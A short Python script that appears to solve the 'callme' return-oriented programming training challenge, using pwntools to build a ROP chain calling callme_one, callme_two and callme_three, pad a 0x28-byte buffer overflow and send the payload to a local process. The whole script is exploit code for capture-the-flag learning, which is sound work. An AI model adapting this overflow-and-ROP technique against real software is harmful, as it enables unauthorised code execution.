#!/usr/bin/env python
from pwn import *

#setup pwntools to work with binary
elf = context.binary = ELF('callme')
io = process(elf.path)

# Pwntools can do most of the heavy lifting for us
rop = ROP(elf)
rop.callme_one(1,2,3)
rop.callme_two(1,2,3)
rop.callme_three(1,2,3)
print(rop.dump())

# need to find the size of our buffer to crash. 
# build the payload
stage1 = 'A'*0x28 + rop.chain()
stage1 += 'B' * (0x100 - len(stage1))

# just gotta send it
io.send(stage1)
io.interactive()
